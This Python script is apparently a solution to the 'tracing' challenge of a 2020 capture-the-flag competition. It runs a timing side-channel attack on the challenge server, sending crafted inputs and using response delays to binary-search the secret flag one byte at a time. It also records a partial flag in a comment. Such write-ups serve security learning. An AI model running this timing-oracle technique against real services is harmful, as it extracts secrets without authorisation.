#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import time

context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':1337},
                        remote  = {'host':'tracing.2020.ctfcompetition.com', 'port':1337})
env.select()

#==========

def attack(conn, **kwargs):
    ids = ''
    for i in range(0x2):
        for j in range(0x100):
            ids += kwargs['cand'].ljust(14, '\x00')+('{:c}'*2).format(i, j)
    conn.send(ids)
    conn.shutdown('send')

    conn.recv(4)
    start = time.time()
    try:
        conn.recv(1)
    except:
        pass
    elapsed_time = time.time() - start
    print(elapsed_time)

    return elapsed_time > 0.01

#==========

def main():
    # flag = 'CTF{1BitAtATim'
    flag = 'CTF{'
    while len(flag)<14:
        cands = range(0x100)
        while len(cands) > 1:
            mid = int(len(cands)/2)

            comn = Communicate(env.mode, **env.target)
            comn.quiet = True
            comn.connect()
            if comn.run(attack, cand=flag+chr(cands[mid])):
                print(hex(cands[mid]), True)
                cands = cands[mid:]
            else:
                print(hex(cands[mid]), False)
                cands = cands[:mid]
            comn.close()
        flag += chr(cands[0])
        print('flag : ', flag)

if __name__=='__main__':
    main()

#==========
